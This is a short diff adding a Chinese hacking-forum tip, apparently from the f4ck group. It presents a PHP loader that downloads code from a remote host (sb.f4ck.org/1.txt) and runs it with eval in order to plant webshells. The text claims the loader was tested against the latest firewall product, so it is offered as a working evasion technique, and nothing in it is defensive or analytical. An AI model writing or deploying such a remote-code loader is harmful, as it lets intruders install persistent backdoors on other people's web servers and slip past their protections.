@@ -1,0 +1,14 @@
+[法客二周年]
+
+<?php
+$b=file_get_contents("URL");
+eval($b);
+?>
+比如：URL=sb.f4ck.org/1.txt 
+内容为小马
+不需要开头的“<?php"和结尾的"?>"
+<?php
+$b=file_get_contents("http://sb.f4ck.org/1.txt");
+eval($b);
+?>
+就会看到你喜欢的大马，小马，已在最新狗上测试
